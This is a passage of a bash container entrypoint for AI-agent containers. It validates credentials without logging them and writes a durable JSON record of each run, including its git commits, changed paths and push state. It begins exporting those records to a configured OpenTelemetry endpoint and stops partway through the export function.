#!/usr/bin/env bash
# entrypoint.sh — container PID 1 for the agent-container image.
#
# Responsibilities (in order):
#   1. Validate required env vars (fail fast, never log their values).
#   1r. Open this run's record on the 'runs' volume (Feature 016) — written at
#      START, and FIRST, so a run that is KILLED still leaves one; completed on
#      every exit path this script can still reach.
#   2. Install/persist/generate the SSH host key + assemble authorized_keys
#      (from bind-mount, env, or the persisted ~/.ssh volume) as the dev user.
#   3. Configure git identity + HTTPS credential helper for the dev user.
#   3e. Take the repository baseline once the workspace is populated, so the
#      record can state what the run committed and whether it pushed.
#   4. Start sshd in the background.
#   5. Start a detached tmux session named 'main' for the dev user.
#   6. Stay alive as PID 1, forwarding SIGTERM/SIGINT to a clean shutdown.
#
# Runs as the non-root 'dev' user with NO root/sudo (fully rootless container):
# sshd runs as dev on an unprivileged port and the SSH host key lives in the
# dev-owned ~/.ssh volume. NEVER echoes env-var contents to logs.
#
# Override: if invoked with arguments, exec them instead of the default flow
# (e.g. `docker run image bash` for debugging).

set -euo pipefail

log() {
    # Stderr so it interleaves predictably with sshd's stderr logging.
    printf '[entrypoint] %s\n' "$*" >&2
}

die() {
    log "FATAL: $*"
    exit 1
}

# --- Debug override ---------------------------------------------------------
# If the operator passed a command (e.g. `bash`), run it instead of the default
# sshd+tmux flow. This lets the image be used interactively for debugging.
if [[ $# -gt 0 ]]; then
    exec "$@"
fi

# --- 1. Validate env vars ---------------------------------------------------
# Required: must be set AND non-empty. We check presence by name only; we never
# print or trace the values. `set -u` plus :- pattern keeps `set -e` from
# tripping on unset vars during the check itself.
require_env() {
    local name=$1
    if [[ -z "${!name:-}" ]]; then
        die "required env var ${name} is missing or empty"
    fi
}

require_env GH_TOKEN
require_env GIT_USER_NAME
require_env GIT_USER_EMAIL

# Optional: agents can authenticate either via these keys OR via interactive
# login inside the container ('claude login' / 'codex login'), whose OAuth
# credential persists on the per-container volume and auto-refreshes. So an
# absent key is only a NOTE, not a hard failure.
for opt in ANTHROPIC_API_KEY OPENAI_API_KEY; do
    if [[ -z "${!opt:-}" ]]; then
        log "NOTE: optional env var ${opt} is not set. Either set it in .env, or run the agent's interactive login inside the container (e.g. 'claude login' / 'codex login'); that credential persists on this container's volume across restarts."
    fi
done

# INJECT_DIR is where the CLI bind-mounts the per-boot files: the SSH host key
# and authorized_keys (section 2) and the headless task (section 1r, just below,
# which is why this is resolved here rather than beside its first reader).
# AGENT_CONTAINER_INJECT_DIR lets the off-container test harness redirect it;
# production leaves it unset so the default is the real bind-mount path.
INJECT_DIR="${AGENT_CONTAINER_INJECT_DIR:-/run/agent-container}"

# --- 1r. Run record — open it at START, before anything else (Feature 016) ---
# Every run leaves a small durable JSON record that outlives its container. The
# CONTAINER writes it because a DETACHED headless run — the default headless
# mode — ends with no CLI attached: the entrypoint is the only thing present at
# that moment (FR-001a). The tool ingests it off the per-container 'runs' volume
# on its next contact with this host, and stamps the fields only it knows.
#
# WRITTEN AT START, NOT ONLY AT EXIT. `docker kill` sends SIGKILL, which runs no
# trap and leaves this script no exit path at all — so the file written here is
# the ONLY reason a killed run is recoverable (data-model §7, SC-008). A record
# emitted solely at exit would lose exactly the abnormally-ended runs an operator
# goes looking for, and would lose them silently.
#
# IT RUNS FIRST — before the shell-env seed, the SSH host key and the git
# identity — because a container is KILLABLE from the instant the runtime marks
# it `Up`, which is before this script has executed a line. Anything placed ahead
# of this section is time in which a SIGKILL leaves NO record at all: not a run
# with an unknown ending, but a run `runs list` cannot say ever happened, which
# is the one failure an operator cannot even detect. Measured on an idle Linux
# host: the steps that used to precede it cost 20-60ms, this section itself costs
# 100-440ms, and bash's own startup — which nothing here can remove — costs
# 80-350ms before that. So ordering shrinks the window; it does not close it, and
# a container killed in the first fraction of a second still has no run to
# record. Nothing may be added above this line without paying for it in runs lost
# without a trace.
#
# Running first also covers what the original placement was reaching for: every
# `die` below — an invalid injected host key (2), clone-on-start (3d) — now
# leaves an account of the container that started and failed to set itself up.
#
# Ordering inside this section is deliberate: state, then encoders, then the
# repository capture, then the writer, then the exit paths, then the single call
# that opens the record.
RUNS_DIR="${AGENT_CONTAINER_RUNS_DIR:-/var/lib/agent-container/runs}"
RUNS_ID=""              # non-empty ONLY once a record has been opened
RUNS_STARTED_AT=""
RUNS_KIND=""
RUNS_AGENT=""
RUNS_TASK_JSON="null"
# Feature 017 FR-009a/FR-009h. Both fields exist on EVERY record the container
# writes, because the payload definition is one set shared by both observability
# legs (data-model §6) — a record missing a field on one leg is a record the
# reconciliation in SC-020 cannot compare.
#
# ATTRIBUTION is null here and that is a claim, not a gap: the container writes
# its own run record, and a run is not a management action performed BY a control
# plane. FR-009a's attribution is stamped where a management ACTION lands.
RUNS_ATTRIBUTION_JSON="null"
# `pending` at birth (data-model §7): written, not yet resolved with the endpoint.
# Never "absent until exported" — an absent state cannot distinguish a record
# that was never sent from one whose outcome was lost, and telling those apart is
# the entire purpose of the field. Overwritten by the export attempt's OUTCOME,
# never by the fact that one was attempted (FR-009i).
RUNS_EXPORT_STATE="pending"
RUNS_NOTES=()
RUNS_COMPLETED=0
RUNS_SIGNALLED=0
AGENT_PID=""            # the headless agent, once started (see run_headless_agent)

# Repository effect (T026/T027/T051/T052). The baseline is taken at start and
# kept HERE, in shell state, rather than in the pending record — see
# runs_repo_capture_start for why half an effect is worse than none.
RUNS_REPO_JSON="null"       # the stated effect; null means NOT CAPTURED (see runs_emit)
RUNS_REPO_DIR=""            # the workspace the baseline was taken from
RUNS_REPO_START_HEAD=""
RUNS_REPO_START_STATE=""
RUNS_REPO_CAPTURED=0        # 1 ONLY once a baseline exists to measure against
RUNS_GIT_DEADLINE=0         # wall-clock bound on the exit capture; 0 = unbounded
RUNS_PROBE_STATE=""         # runs_repo_probe's four outputs. Globals because bash
RUNS_PROBE_HEAD=""          # cannot return five values and a subshell would lose
RUNS_PROBE_BRANCH=""        # them; declared here so `set -u` can never bite on a
RUNS_PROBE_UPSTREAM=""      # path that reads them before a probe has run.

# The changed-path and commit lists are CAPPED at this many entries. A run that
# touched ten thousand files would otherwise write a record larger than every
# other record combined (research R11) — but the cap is NEVER SILENT: it sets
# `repository.paths_truncated` and adds a note naming the real total, because a
# truncated list that looked complete would answer "no run changed that file"
# with confidence when one did (C16, T052).
RUNS_PATHS_MAX=200

# Feature 004's execution shape is resolved HERE, ahead of its own section below,
# because the record's `kind`, `agent` and `task` are read off it.
# AGENT_CONTAINER_MODE (default interactive) selects the container's shape;
# AGENT_CONTAINER_AGENT (claude|codex|pi|opencode) names the primary agent, and
# when UNSET the pre-004 bare-shell layout is preserved (no agent auto-launched).
# The optional initial/headless task arrives as an EPHEMERAL injected file.
AGENT_CONTAINER_MODE="${AGENT_CONTAINER_MODE:-interactive}"
AGENT_CONTAINER_AGENT="${AGENT_CONTAINER_AGENT:-}"
TASK_FILE="${INJECT_DIR}/task"

# JSON string encoder. The task text is operator-authored free text (data-model
# §5) in which quotes, backslashes and newlines are ORDINARY — leave one
# unescaped and the record is not JSON, a failure that surfaces at INGESTION,
# long after the container that could have been asked about it is gone.
#
# Every C0 control character is replaced unconditionally rather than behind a
# "does the string contain one?" test. Such a test is one more thing that can be
# wrong about locale and collation, and if it were wrong the record would be
# silently unparseable — which is the failure it was added to prevent.
json_string() {
    local s=${1-} i ch esc
    # Backslash FIRST: every replacement below INSERTS backslashes, which must
    # not then be escaped a second time.
    s=${s//\\/\\\\}
    s=${s//\"/\\\"}
    for (( i = 1; i < 32; i++ )); do
        printf -v ch '%b' "\\0$(printf '%03o' "${i}")"
        case "${i}" in
            8)  esc='\b' ;;
            9)  esc='\t' ;;
            10) esc='\n' ;;
            12) esc='\f' ;;
            13) esc='\r' ;;
            *)  printf -v esc '\\u%04x' "${i}" ;;
        esac
        s=${s//"${ch}"/${esc}}
    done
    printf '"%s"' "${s}"
}

# An absent value is `null`, never the empty string. `"start_head": ""` would read
# as a commit whose id is empty rather than as a commit nobody could name — the
# same false-precision trap as a `0` for unreported usage (research R6).
json_or_null() {
    if [[ -z "${1-}" ]]; then printf 'null'; else json_string "$1"; fi
}

# A JSON array of the arguments, each encoded as a string.
json_array() {
    local out='' e
    for e in "$@"; do
        [[ -n "${out}" ]] && out+=", "
        out+="$(json_string "${e}")"
    done
    printf '[%s]' "${out}"
}

# A diagnostic that reaches BOTH channels. FR-008/C11: a record that could not be
# written cleanly must not fail the run and must not be silent. `notes` is the
# in-record half; the log is the half that still exists when the record itself is
# the thing that could not be written.
runs_note() {
    log "run record: $*"
    RUNS_NOTES+=("$*")
}

runs_notes_json() {
    local out='' n
    # The ${a[@]+"${a[@]}"} form, because `set -u` treats an empty array's
    # expansion as an unset variable on older bash.
    for n in ${RUNS_NOTES[@]+"${RUNS_NOTES[@]}"}; do
        [[ -n "${out}" ]] && out+=", "
        out+="$(json_string "${n}")"
    done
    printf '[%s]' "${out}"
}

# 32 bits of entropy after the timestamp. The id must be unique within one
# environment on one host, and a restart loop can start two runs inside the same
# second — the seconds-resolution stamp alone would then collide and the second
# run would overwrite the first's record.
runs_nonce() {
    local n
    n="$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
    [[ -n "${n}" ]] || printf -v n '%04x%04x' "${RANDOM}" "${RANDOM}"
    printf '%s' "${n}"
}

# --- Repository effect (T026/T027/T051/T052) ---------------------------------
# What the run changed, read from git at START and again at EXIT. NO AGENT
# INVOLVEMENT anywhere below: the run that most needs a record is the one where
# the agent crashed (FR-004a), so nothing here may depend on the agent
# cooperating, reporting, or even having got as far as running.

# Bounded git, always against the workspace the baseline was taken from.
#
# The bound exists because the EXIT capture runs inside the runtime's stop grace
# period (research R5): SIGTERM opens it, SIGKILL closes it, and a git call that
# blocks in between costs the whole RECORD, not merely the repository detail it
# was fetching. Two bounds, because either alone is insufficient — `timeout` caps
# ONE call, and half a dozen capped calls still add up past the grace period, so
# RUNS_GIT_DEADLINE caps the sequence. 124 is `timeout`'s own status for "did not
# finish in time", reused here so callers have one code to recognise.
#
# `timeout` is coreutils, which the image has. The fallback is for the
# off-container harness on a host without it — so the bound, exactly like the
# fsync below, is the CONTAINER's guarantee and not the harness's.
git_bounded() {
    if [[ "${RUNS_GIT_DEADLINE}" -ne 0 && "$(date +%s)" -ge "${RUNS_GIT_DEADLINE}" ]]; then
        return 124
    fi
    if command -v timeout >/dev/null 2>&1; then
        timeout 5 git -C "${RUNS_REPO_DIR}" "$@" 2>/dev/null
    else
        git -C "${RUNS_REPO_DIR}" "$@" 2>/dev/null
    fi
}

# Read the workspace's git position into RUNS_PROBE_*, classifying it into one of
# the five states of C7 / data-model §3.
#
# EVERY ONE OF THEM IS A RECORD, NOT AN ERROR. Research R4 MEASURED the exit
# codes these branches read — `rev-parse @{u}` → 128 with no upstream,
# `symbolic-ref -q HEAD` → 1 when detached, and 128 outside a repository — and an
# `ephemeral` workspace with no clone is the ordinary case for a throwaway run.
# A capture that treated any of them as a failure would report the absence of a
# repository as the absence of a run.
#
# `x="$(cmd)" || rc=$?` throughout, never a bare assignment: under `set -e` a
# plain `x="$(failing)"` ends the script, and these branches exist precisely to
# handle git FAILING. The assignment is the first command of an AND-OR list,
# which errexit is specified to ignore.
runs_repo_probe() {
    RUNS_PROBE_STATE="" RUNS_PROBE_HEAD="" RUNS_PROBE_BRANCH="" RUNS_PROBE_UPSTREAM=""
    local out rc=0
    out="$(git_bounded rev-parse --is-inside-work-tree)" || rc=$?
    if [[ "${rc}" -eq 124 ]]; then RUNS_PROBE_STATE="unreadable"; return 0; fi
    # A bare repository prints `false` and exits 0, which is the same answer as
    # "no repository" for this purpose: there is no work tree for a run to change.
    if [[ "${rc}" -ne 0 || "${out}" != "true" ]]; then
        RUNS_PROBE_STATE="no-repository"
        return 0
    fi

    rc=0
    out="$(git_bounded rev-parse HEAD)" || rc=$?
    if [[ "${rc}" -eq 124 ]]; then RUNS_PROBE_STATE="unreadable"; return 0; fi
    # A non-zero HERE — with a work tree confirmed above — is an UNBORN branch: a
    # repository with no commits yet (`git init`, or a clone of an empty repo).
    # That is neither `no-repository` nor `unreadable`; the branch is known and
    # the run may be about to make the first commit. The head simply stays null,
    # and the exit capture treats the empty tree as the baseline.
    [[ "${rc}" -eq 0 ]] && RUNS_PROBE_HEAD="${out}"

    rc=0
    out="$(git_bounded symbolic-ref -q --short HEAD)" || rc=$?
    if [[ "${rc}" -eq 124 ]]; then RUNS_PROBE_STATE="unreadable"; return 0; fi
    if [[ "${rc}" -ne 0 || -z "${out}" ]]; then
        # `symbolic-ref -q` exits 1 on a detached HEAD (R4, measured). A detached
        # run is on no branch and therefore has no upstream to push to, so this
        # returns rather than falling through to the upstream probe — asking for
        # `@{u}` here would report `no-upstream` for a state that already has a
        # more specific name.
        RUNS_PROBE_STATE="detached"
        return 0
    fi
    RUNS_PROBE_BRANCH="${out}"

    rc=0
    out="$(git_bounded rev-parse --abbrev-ref '@{u}')" || rc=$?
    if [[ "${rc}" -eq 124 ]]; then RUNS_PROBE_STATE="unreadable"; return 0; fi
    if [[ "${rc}" -ne 0 || -z "${out}" ]]; then
        # 128 (R4, measured). A branch with nowhere to push is an ordinary state,
        # and it is the one that makes `pushed` null rather than false (C8) —
        # `false` means "committed and did not push", which FR-005 requires to be
        # loud, and conflating it with "could not tell" would make the loudest
        # signal in the feature unreliable.
        RUNS_PROBE_STATE="no-upstream"
        return 0
    fi
    RUNS_PROBE_UPSTREAM="${out}"
    RUNS_PROBE_STATE="ok"
}

# Take the baseline. Called ONCE, after clone-on-start has populated the
# workspace — before it, a clone's entire imported history would be measured as
# something this run committed.
#
# The baseline is kept in shell state and the PENDING record still says
# `repository: null`, deliberately. A pending record carrying a start head but no
# end state would have to serialise `commits` and `paths` as empty, and empty
# renders as "changed nothing" — a confident wrong answer for the one case that
# reads a pending record, the SIGKILLed run that may well have committed. The
# effect is stated once, at exit, when both ends of it are known; until then
# `null` means what runs_emit says it means: not captured.
runs_repo_capture_start() {
    [[ -n "${RUNS_ID}" ]] || return 0
    RUNS_REPO_DIR="${WORKSPACE_DIR}"
    # No sequence deadline at start: nothing is racing a SIGKILL yet. The
    # per-call `timeout` still applies.
    RUNS_GIT_DEADLINE=0
    runs_repo_probe
    RUNS_REPO_START_HEAD="${RUNS_PROBE_HEAD}"
    RUNS_REPO_START_STATE="${RUNS_PROBE_STATE}"
    RUNS_REPO_CAPTURED=1
    log "run record ${RUNS_ID}: repository baseline is '${RUNS_PROBE_STATE}'${RUNS_PROBE_HEAD:+ at ${RUNS_PROBE_HEAD}}"
}

# Measure the effect and build RUNS_REPO_JSON. Called from runs_complete, so it
# runs on every exit path the entrypoint can still reach — including the SIGTERM
# one, where it spends part of the stop grace period on purpose: whether a run
# that was stopped had committed first is exactly what an operator asks.
runs_repo_capture_exit() {
    [[ "${RUNS_REPO_CAPTURED}" -eq 1 ]] || return 0
    # 5s of a 10s default grace period. The repository detail is worth having and
    # it is NOT worth the record — this deadline is what keeps the second true.
    RUNS_GIT_DEADLINE=$(( $(date +%s) + 5 ))

    runs_repo_probe
    local state="${RUNS_PROBE_STATE:-unreadable}" head="${RUNS_PROBE_HEAD}"
    local branch="${RUNS_PROBE_BRANCH}" upstream="${RUNS_PROBE_UPSTREAM}"
    local -a commits=() paths=()
    local truncated="false" pushed="null" rc=0 tmp="" base="" line p n=0

    # Was there a baseline to measure AGAINST? `no-repository` and `unreadable`
    # at start mean there was not, and the difference is not academic: a
    # workspace that GAINED a repository during the run — an agent that cloned
    # into it — has a full history at exit and none of it is this run's work.
    # Attributing it would be the loudest wrong answer this record can give.
    local attributable=0
    case "${RUNS_REPO_START_STATE}" in
        ok|no-upstream|detached) attributable=1 ;;
    esac

    # `pushed` is a statement about the workspace at exit, so it is computed
    # wherever both ends of the comparison exist — independently of whether the
    # commits can be attributed. Ancestry, not equality: after a push the
    # tracking ref moves to the tip, and a remote that has since moved AHEAD does
    # not make this run's work unpushed.
    if [[ -n "${head}" && -n "${upstream}" ]]; then
        rc=0
        git_bounded merge-base --is-ancestor "${head}" '@{u}' >/dev/null || rc=$?
        case "${rc}" in
            0) pushed="true" ;;
            1) pushed="false" ;;
            *) runs_note "git could not compare the workspace against ${upstream} (exit ${rc}); 'pushed' is left unknown rather than guessed" ;;
        esac
    fi

    if [[ -z "${head}" ]]; then
        # Nothing to measure to. Unborn at exit, or a workspace that no longer
        # holds a repository at all. When there WAS a baseline, that silence is
        # flagged: an empty list here would read as "this run changed nothing".
        if [[ "${attributable}" -eq 1 ]]; then
            truncated="true"
            runs_note "the workspace held a repository at start but no commit could be read at exit (state '${state}'); the changed-path list is INCOMPLETE, not empty"
        fi
    elif [[ "${attributable}" -eq 0 ]]; then
        truncated="true"
        runs_note "the workspace held no repository when this run started (state '${RUNS_REPO_START_STATE:-unknown}'), so the history present at exit is not this run's work; the changed-path list is INCOMPLETE, not empty"
    else
        tmp="$(mktemp 2>/dev/null)" || tmp=""
        if [[ -z "${tmp}" ]]; then
            truncated="true"
            runs_note "could not stage git's output; the changed-path list is INCOMPLETE, not empty"
        else
            # What end_head contains that start_head did not (data-model §3). An
            # empty start head is the unborn case: every commit reachable from
            # the tip was made during this run.
            local range="${head}"
            [[ -n "${RUNS_REPO_START_HEAD}" ]] && range="${RUNS_REPO_START_HEAD}..${head}"
            rc=0
            git_bounded rev-list "${range}" > "${tmp}" || rc=$?
            if [[ "${rc}" -ne 0 ]]; then
                truncated="true"
                runs_note "git could not list this run's commits (exit ${rc}); 'commits' is empty because it is UNKNOWN, not because there were none, and paths_truncated is set so no query reads this record as a confident no"
            else
                while IFS= read -r line; do
                    [[ -n "${line}" ]] || continue
                    n=$((n + 1))
                    [[ "${n}" -le "${RUNS_PATHS_MAX}" ]] && commits+=("${line}")
                done < "${tmp}"
                if [[ "${n}" -gt "${RUNS_PATHS_MAX}" ]]; then
                    truncated="true"
                    # paths_truncated is set here even though the diff below is
                    # taken across the WHOLE range and so may well be complete.
                    # Erring towards "uncertain" costs a query a hedge; erring
                    # the other way lets a capped record answer "no run changed
                    # that file" with confidence (C16).
                    runs_note "this run's commit list was capped at ${RUNS_PATHS_MAX} of ${n} commits; the record's account of this run is incomplete, so paths_truncated is set"
                fi
            fi

            base="${RUNS_REPO_START_HEAD}"
            if [[ -z "${base}" ]]; then
                # Unborn at start: diff against the EMPTY TREE. Asked of git
                # rather than hardcoded as 4b825dc…, so the baseline is one a
                # reader can verify instead of a constant taken on trust.
                base="$(git_bounded hash-object -t tree /dev/null)" || base=""
            fi
            if [[ -z "${base}" ]]; then
                truncated="true"
                runs_note "git could not name an empty-tree baseline; the changed-path list is INCOMPLETE, not empty"
            else
                rc=0
                # `-z` is load-bearing. Without it git C-QUOTES any path holding a
                # space, a quote or a non-ASCII byte (src/"a b".py → "src/\"a b\".py"),
                # and the record would carry a name that matches nothing when
                # `runs list --changed` is later asked about the real one (C16).
                # NUL-delimited output must be read by `read -d ''` and never
                # through a variable: bash DROPS NUL bytes, which would silently
                # concatenate every path into one.
                git_bounded diff --name-only -z "${base}" "${head}" > "${tmp}" || rc=$?
                if [[ "${rc}" -ne 0 ]]; then
                    truncated="true"
                    runs_note "git could not list the changed paths (exit ${rc}); the list is INCOMPLETE, not empty"
                else
                    n=0
                    while IFS= read -r -d '' p; do
                        n=$((n + 1))
                        [[ "${n}" -le "${RUNS_PATHS_MAX}" ]] && paths+=("${p}")
                    done < "${tmp}"
                    if [[ "${n}" -gt "${RUNS_PATHS_MAX}" ]]; then
                        truncated="true"
                        runs_note "the changed-path list was capped at ${RUNS_PATHS_MAX} of ${n} paths — repository.paths_truncated is true, so a run missing from 'runs list --changed' may still have touched the file"
                    fi
                fi
            fi
            rm -f "${tmp}" 2>/dev/null || true
        fi
    fi

    # One line, like `usage` above it: the record is machine-read, and a nested
    # multi-line fragment would only make the file prettier for nobody.
    RUNS_REPO_JSON="$(printf '{ "start_head": %s, "end_head": %s, "branch": %s, "upstream": %s, "commits": %s, "paths": %s, "paths_truncated": %s, "pushed": %s, "state": %s }' \
        "$(json_or_null "${RUNS_REPO_START_HEAD}")" \
        "$(json_or_null "${head}")" \
        "$(json_or_null "${branch}")" \
        "$(json_or_null "${upstream}")" \
        "$(json_array ${commits[@]+"${commits[@]}"})" \
        "$(json_array ${paths[@]+"${paths[@]}"})" \
        "${truncated}" \
        "${pushed}" \
        "$(json_string "${state}")")"
}

# The outcome vocabulary, CLOSED and SCOPED TO THE KIND (data-model §2, C5).
# Stated here as data rather than left implicit in runs_complete's if/else,
# because FR-003 requires `finished` and `failed` to be UNREPRESENTABLE for a
# session rather than merely unwritten by today's branches — and THIS FILE is
# where every real interactive record is produced. The tool's own validator never
# sees one: an ingested record is stamped and stored VERBATIM, so a branch added
# here that named a session `failed` would reach `runs list` unchallenged, and
# SC-002 ("zero interactive sessions marked finished or failed") would stop being
# measurable anywhere.
#
# `never-started` is deliberately ABSENT from the headless set even though the
# vocabulary has it. It is the TOOL's outcome for a container that never ran (C6),
# and a record written from inside one is itself the proof that it did.
runs_outcome_is_legal() {
    case "$1:$2" in
        headless:finished|headless:failed|headless:stopped) return 0 ;;
        interactive:ended|interactive:stopped) return 0 ;;
    esac
    return 1
}

# Write the record at its final name, atomically. ALWAYS RETURNS 0 — see
# runs_on_exit for why that is the contract rather than an oversight.
#   $1 outcome (empty => null, i.e. still pending)
#   $2 ended_at (empty => null, i.e. still pending)
#   $3 exit_code (empty => null)
runs_emit() {
    local outcome_json='null' ended_json='null' exit_json='null' body final tmp
    if [[ -n "${1:-}" ]]; then
        if runs_outcome_is_legal "${RUNS_KIND}" "$1"; then
            outcome_json="$(json_string "$1")"
        else
            # REFUSED — and the record is still written, with `outcome` left null,
            # which is the one honest answer available. Coercing to `stopped`
            # (the outcome legal for both kinds) would assert that an operator
            # stopped a run nobody stopped, and dying here would trade a
            # mislabelled record for no record at all, which C11 forbids. Null
            # means "no exit path named an ending this kind can have"; ingestion
            # completes it as `stopped` and says it reconstructed it, so the two
            # notes together state exactly what was and was not known.
            runs_note "outcome '$1' is not in the vocabulary for a '${RUNS_KIND}' run and was REFUSED (FR-003, C5); this record is left with no outcome rather than an invented one"
        fi
    fi
    [[ -n "${2:-}" ]] && ended_json="$(json_string "$2")"
    [[ -n "${3:-}" ]] && exit_json="$3"

    if ! mkdir -p "${RUNS_DIR}" 2>/dev/null; then
        runs_note "cannot create ${RUNS_DIR}; this run will have no record. An image built before the 'runs' volume existed has no dev-owned mount point there — rebuild and redeploy."
        return 0
    fi
    final="${RUNS_DIR}/${RUNS_ID}.json"
    # Staged under a DOT-prefixed name ending in .tmp, in the SAME directory: the
    # tool's listing skips exactly that shape, so a half-written record can never
    # be read as a finished one, and a rename within one directory is atomic —
    # which is what gives FR-009 (no interleaving, no loss) with no lock at all.
    tmp="${RUNS_DIR}/.${RUNS_ID}.json.$$.tmp"

    # `environment` and `host` are BOTH null here and BOTH stamped at ingestion.
    # The record arrives on the volume `agent-container-<name>-runs`, so the tool
    # draining it knows the environment with certainty; the container is never
    # told its own environment name, and telling it would create a second copy
    # that can drift from the volume the tool actually keys on.
    #
    # `task` is recorded for a HEADLESS run only. An interactive session has no
    # task (FR-002), and the tool REFUSES to construct an interactive record that
    # carries one — a task on a session record would be an invented fact.
    #
    # `repository` is null until the EXIT capture states an effect (T026/T027).
    # Null means "not captured" — the run ended before the workspace was
    # inspected, or was killed outright — and it is NOT the `no-repository` state
    # of C7, which is a positive statement that the workspace held no repository.
    # The two must not be read as the same answer: one is silence, the other is
    # a measurement.
    body=$(cat <<EOF
{
  "schema": 1,
  "run_id": $(json_string "${RUNS_ID}"),
  "environment": null,
  "host": null,
  "agent": $(json_string "${RUNS_AGENT}"),
  "kind": $(json_string "${RUNS_KIND}"),
  "task": ${RUNS_TASK_JSON},
  "started_at": $(json_string "${RUNS_STARTED_AT}"),
  "ended_at": ${ended_json},
  "outcome": ${outcome_json},
  "exit_code": ${exit_json},
  "repository": ${RUNS_REPO_JSON},
  "usage": { "reported": false },
  "attribution": ${RUNS_ATTRIBUTION_JSON},
  "egress_decision": null,
  "export_state": $(json_string "${RUNS_EXPORT_STATE}"),
  "notes": $(runs_notes_json)
}
EOF
)
    # umask rather than a follow-up chmod, so the file is NEVER briefly readable:
    # `task` is the one field that can carry a credential the operator typed
    # (data-model §5), and a window is still a window.
    if ! ( umask 0077; printf '%s\n' "${body}" > "${tmp}" ) 2>/dev/null; then
        rm -f "${tmp}" 2>/dev/null
        runs_note "could not stage the record at ${tmp}"
        return 0
    fi
    # fsync before the rename: the rename orders the NAME, not the CONTENT, so a
    # host crash between the two can leave a correctly-named EMPTY record — which
    # reads as corruption rather than as absence, the one outcome worse than no
    # record at all. `sync <file>` is coreutils, which the image has; the fallback
    # is for the off-container test harness on a BSD `sync`, which takes no
    # operand. So this durability claim is the CONTAINER's, not the harness's.
    sync "${tmp}" 2>/dev/null || true
    if ! mv -f "${tmp}" "${final}" 2>/dev/null; then
        rm -f "${tmp}" 2>/dev/null
        runs_note "could not place the record at ${final}"
        return 0
    fi
    # FR-009g/C16: WRITE TIME, per record, and AFTER the record is durable. The
    # order matters — exporting first would risk a record at the collector that
    # the local leg never had, which is the one divergence SC-020 cannot explain.
    #
    # Never allowed to fail the run: `runs_otlp_export` returns 0 on every path,
    # and the `|| true` states that here rather than relying on it.
    runs_otlp_export "${final}" || true
    return 0
}

# --- OTLP export (Feature 017 FR-009d/FR-009g/FR-009h, C16, R5) --------------
#
# THIS BLOCK LIVES IN THE AGENT ENTRYPOINT ONLY, and is deliberately NOT marked
# as a shared block. The control-plane image writes no run records in shell —
# its records are the attribution records the CLI writes inside it, in Python —
# so a copy there would be dead code, and a SHARED-BLOCK sentinel around a block
# that exists once would claim a guarantee no guard provides. That reads as
# coverage, which is worse than saying nothing.
#
# A `curl` POST of a JSON document. ZERO Python packages and zero image
# additions: `curl` and `jq` already ship. `opentelemetry-sdk` is permitted by
# FR-009d but not reached for, because the dependency-free path is sufficient —
# which is the condition FR-009d set. No backend-specific package, ever.
#
# FIRES AT WRITE TIME, PER RECORD. Not batched at exit, not on a timer: anything
# held for later is lost exactly when a container is `kill -9`'d, which is the
# circumstance under which someone later asks what happened. It also needs no
# resident exporter — the project avoids those on the same grounds Feature 012's
# boundary runs no refresher — and it is natural rather than imposed, because a
# `curl` POST has nothing to flush.
#
# FAIL-OPEN, ALWAYS. Every failure path here returns 0 and leaves a note. An
# export that could fail the run would make observability a reason for work not
# to happen, and under enforced egress an undeclared collector would then break
# every container instead of merely leaving the trail local.
OTLP_TIMEOUT="${AGENT_CONTAINER_OTLP_TIMEOUT:-10}"

# Rewrite one record's export_state in place. The state is DERIVED FROM THE
# RESPONSE (FR-009i); this function is only the writer.
runs_set_export_state() {
    local path="$1" state="$2" tmp
    tmp="${path}.state.$$.tmp"
    if ! jq --arg s "${state}" '.export_state = $s' "${path}" > "${tmp}" 2>/dev/null; then
        rm -f "${tmp}" 2>/dev/null
        return 1
    fi
    ( umask 0077; cat "${tmp}" > "${path}" ) 2>/dev/null || { rm -f "${tmp}"; return 1; }
    rm -f "${tmp}" 2>/dev/null
    return 0
}

# The OTLP/HTTP+JSON logs payload for one record.
#
# `run_id` is an ATTRIBUTE, not only part of the body, because that is what makes
# a collector record matchable to its local counterpart (C18f) — and it is
# exported WHATEVER the task setting is, which is what makes excluding the task
# cheap rather than lossy.
#
# THE TASK IS STRIPPED BY NAME (FR-009f). `del(.task)` — no regex, no entropy
# heuristic, no "looks like a token" check. A redactor that misses one value
# converts caution into false confidence; omitting a named field either happens
# or it does not.
runs_otlp_payload() {
    local path="$1" include_task="$2" now_ns
    # Nanoseconds since epoch. GNU date does %N; busybox/BSD do not, so a literal
    # 'N' falls back to zero-padding — checked rather than assumed, because a
    # malformed timestamp makes a collector reject the whole request and the
    # record would read as `rejected` for a reason that is not the endpoint's.
    now_ns="$(date +%s%N 2>/dev/null)"
    case "${now_ns}" in
        *[!0-9]*|"") now_ns="$(( $(date +%s) * 1000000000 ))" ;;
    esac
    local filter='.'
    [[ "${include_task}" == "1" ]] || filter='del(.task)'
    jq -c \
        --arg ns "${now_ns}" \
        "${filter}"' as $rec | {
            resourceLogs: [{
                resource: { attributes: [
                    { key: "service.name", value: { stringValue: "agent-container" } },
                    { key: "agent_container.run_id",
                      value: { stringValue: ($rec.run_id // "unknown") } }
                ] },
                scopeLogs: [{
                    scope: { name: "agent-container" },
                    logRecords: [{
                        timeUnixNano: $ns,
                        observedTimeUnixNano: $ns,
                        severityText: "INFO",
                        body: { stringValue: ($rec | tostring) },
                        attributes: [
                            { key: "agent_container.run_id",
                              value: { stringValue: ($rec.run_id // "unknown") } },
                            { key: "agent_container.kind",
                              value: { stringValue: ($rec.kind // "unknown") } }
                        ]
                    }]
                }]
            }]
        }' "${path}" 2>/dev/null
}

# Export one record and record the OUTCOME on it.
#
# `accepted` means THE CONFIGURED ENDPOINT RETURNED SUCCESS FOR THIS RECORD and
# nothing more. It is never read, or named, as arrival at a backend: establishing
# that would require querying the backend's own API, the vendor coupling FR-009d
# forbids.
#
# A 2xx IS NOT ACCEPTANCE. OTLP's export response carries `partialSuccess` with
# a rejected-record count, so a receiver may return 200 while refusing records.
# That count is SUBTRACTED before anything is marked accepted — otherwise refused
# records are recorded as delivered, and the local leg claims a delivery the
# collector never made, which is exactly the divergence SC-020 detects.
runs_otlp_export() {
    local path="$1" endpoint="${AGENT_CONTAINER_OTLP_ENDPOINT:-}" payload http body rejected state
    # Undeclared endpoint: the local record IS the trail, and that is a complete
    # outcome rather than a degraded one (C18c). Left `pending` deliberately —
    # `telemetry collect` retries it, so declaring an endpoint later still exports
    # what was written before it existed.
    [[ -n "${endpoint}" ]] || return 0
    [[ -f "${path}" ]] || return 0
